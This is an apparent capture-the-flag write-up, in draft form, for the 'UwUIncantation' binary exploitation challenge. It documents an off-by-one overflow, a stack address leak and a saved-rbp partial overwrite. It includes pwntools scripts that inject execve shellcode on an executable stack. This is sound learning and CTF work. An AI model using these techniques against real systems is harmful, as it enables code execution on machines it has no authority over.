# UwUIncantation
```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
checksec seems to be suggesting shellcode injection
```c
void UwU_read(char* buffer, size_t max_len) {
    size_t pos = 0;
    int c;
    
    while (1) {
        if (max_len < pos) {  // vuln, if pos == max_len, it writes one character
            return;
        }
        
        c = getchar();
        if (c == -1) break;  // EOF
        if (c == '\n') {
            buffer[pos] = '\0';
            return;
        }
        
        buffer[pos] = (char)c;
        pos++;
    }
}
```
```c
if (max_len < pos) {
```
this allows one more byte, at index 8 to potentially overwrite something. 

```c
printf("%s! A domineering name! Tell me, sorcerer, at what level does your incantation stand? UwU\ n"
```
this leaks something, probably printing stuff until null-byte, classic
only happens when the input is exactly 9 bytes (exactly one byte bypassed in UwU_read)
```
aaaaaaaaa5���!
```
```
Leaked data: b'\nAAAAAAAAA\xb6\xdfB\xff\x7f! A domineering name! Tell me, sorcerer, at what level does your incantation stand? UwU'
```
# To do 1:
parse the leaked address and view stack, see what's the address and what's going on in general.


## discoveries 
in `UwU_main` when reading the name input
```
   0x000055e3cde27372 <+240>:	lea    rax,[rbp-0x8]
   0x000055e3cde27376 <+244>:	mov    esi,0x8
   0x000055e3cde2737b <+249>:	mov    rdi,rax
   0x000055e3cde2737e <+252>:	call   0x55e3cde271e9 <UwU_read>
```
the above reveals that the buffer starts at $rbp-0x8
in `UwU_incantation` 
```
   0x000055e3cde2726e <+24>:	lea    rax,[rbp-0x8]
   0x000055e3cde27272 <+28>:	mov    esi,0x8
   0x000055e3cde27277 <+33>:	mov    rdi,rax
   0x000055e3cde2727a <+36>:	call   0x55e3cde271e9 <UwU_read>
```
it also starts from $rbp-0x8 in that particular function


## what I know now 
1. at `UwU_main` and `UwU_incantation`, we are able to write a complete 8-bytes at `$rbp-0x8` as well as overwriting the last byte of `$rbp`
2. 
```
0x7ffd8eabf000     0x7ffd8eae0000 rwxp    21000      0 [stack]
```
likely a challenge related to shellcode injection 
3. The program is so interesting that with the same testing exploit with normal inputs:
```py
from pwn import * 

binary = "./UwUIncantation"
p = process(binary)
elf = ELF(binary)
context.binary = binary
context.log_level = 'debug'

gdb_script = '''
b * UwU_main
b * UwU_main+271
b * UwU_incantation
'''

gdb.attach(p, gdb_script)
print(p.recvuntil("UwU?"))
name_payload = b"A" * 8  
p.sendline(name_payload)
p.sendline("27.0")

print(p.recvuntil("prowess!"))
name_payload = b"A" * 8 
p.sendline(name_payload)

p.interactive()
```
## it ends up randomly:
### returning to buffer (although the original rip is just main)
```
   0x557a49bbf411 <UwU_main+399>          nop    
   0x557a49bbf412 <UwU_main+400>          leave  
 ► 0x557a49bbf413 <UwU_main+401>          ret                                <0x7ffc82291848>
    ↓
   0x7ffc82291848                         sbb    byte ptr [rcx], bpl


──────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────
00:0000│ rsp 0x7ffc82291850 —▸ 0x7ffc82291848 ◂— 0x4141414141414141 ('AAAAAAAA')
```
### returning to new_do_write
```
 0x55b4887c1413 <UwU_main+401>          ret                                <new_do_write+82>
    ↓
   0x7f121822b852 <new_do_write+82>       movzx  edi, word ptr [rbx + 0x80]     EDI, [0x7ffe2a1e2c88] => 0x4238
   0x7f121822b859 <new_do_write+89>       mov    rbp, rax                       RBP => 0x7ffe2a1e2ab8 ◂— 'AAAAAAAA'
   0x7f121822b85c <new_do_write+92>       test   rax, rax                       0x7ffe2a1e2ab8 & 0x7ffe2a1e2ab8     EFLAGS => 0x206 [ cf PF af zf sf IF df of ]
   0x7f121822b85f <new_do_write+95>       je     new_do_write+106            <new_do_write+106>
```
# small conclusion of the above
- turned out the above unexpected behaviour was caused by the last byte of the saved rbp in UwU_incantation and aslr randomization
- because the last byte of saved old rbp in `UwU_incantation`, which can be written with a 9 bytes buffer, sort of control the return address of `UwU_main`
- but the problem is that there's a aslr randomization as well, so after overwriting the last byte of saved old rbp, the return address of `UwU_main` could still become random 
# More problems 
- 9 bytes of writable space in both `UwU_main` and `UwU_incantation` seems to be enough to craft a shellcode playing with `pop` instructions and registers. But then the shellcode would be treated as address, unless there's an address point to the address storing the shellcode instruction. This can be done by leaking the stack address with the 9 bytes buffer and calculating the offset to `$rbp-0x8` which shellcode can be stored. But in this case, 18 bytes sized buffer wouldn't be enough
here is how to do it with aslr off:
```py
from pwn import * 

binary = "./UwUIncantation"
p = process(binary)
elf = ELF(binary)
context.binary = binary
context.log_level = 'debug'
context.arch = 'amd64'

gdb_script = '''
b * UwU_main
b * UwU_main+271
b * UwU_incantation
b * UwU_read
b * UwU_incantation+41
'''

# don't know why the program continue from UwU_main+257 every time
gdb.attach(p, gdb_script)

# First interaction: precise 9-byte overflow to trigger leak
shellcode = asm('''
    push rax
    pop rdi
    push 59
    pop rax
    syscall
''', arch='amd64')
print(p.recvuntil("UwU?"))
payload = shellcode + b'AA'  # Exactly 9 bytes to get leak, that one byte would overwrite old rbp, but null byte can restore it
# since the old rbp in this context always ends in null byte
p.sendline(payload)

# Capture and analyze the leak
#leak = p.recvuntil("UwU")

p.recvuntil("AA")
leak = int.from_bytes(p.recvuntil("!", drop = True), 'little') << 8#& 0xffffffffffffff00
print("Leaked data:", hex(leak)) # leaks old rbp, but need to somehow restore the last byte

#print("Hex dump of leak:", hex(u64(leak)))

# Continue with rest of interaction
print(p.recvuntil(b"UwU\n"))
p.sendline("27.0")  # Valid power level

# Third interaction
print(p.recvuntil("prowess!\n"))
#payload = b"/bin/sh\x00" + b"\x30" #* 8 # Exactly 9 bytes to get leak
payload = p64(leak +0x98) + b"\x70" # bruteforce this byte and 0x98
p.sendline(payload)

p.interactive()
```
`0x98` might have to be adjusted, it's the last byte of `$rbp-0x8`
- this seems to be a problem that we have to very carely play with modifying the last byte of `$rbp`

